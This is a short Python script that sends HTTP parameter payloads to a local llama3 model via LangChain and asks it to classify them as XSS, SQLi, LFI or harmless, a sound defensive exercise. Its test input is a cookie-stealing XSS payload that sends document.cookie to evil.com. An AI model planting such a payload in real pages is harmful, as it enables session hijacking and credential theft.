from langchain_community.llms import Ollama
from langchain.prompts import PromptTemplate

# 1. Connect to our local model
print("Waking up the brain...")
llm = Ollama(model="llama3")

# 2. Create a strict prompt template so it acts like a security tool
template = """
You are an expert bug bounty hunter and application security engineer. 
Analyze the following HTTP parameter payload and determine if it is malicious.
If it is malicious, identify the likely vulnerability type (e.g., XSS, SQLi, LFI) and explain briefly how it works.

Payload to analyze: {payload}

Format your response exactly like this:
VULNERABILITY: [Type or "None"]
EXPLANATION: [Your brief analysis]
"""

prompt = PromptTemplate(
    input_variables=["payload"],
    template=template
)

# 3. Define a test payload (A classic XSS attempt)
test_payload = "<script>fetch('http://evil.com/log?c='+document.cookie)</script>"

# 4. Run the AI
print(f"Analyzing payload: {test_payload}\n")
formatted_prompt = prompt.format(payload=test_payload)
response = llm.invoke(formatted_prompt)

print("--- AI REPORT ---")
print(response)
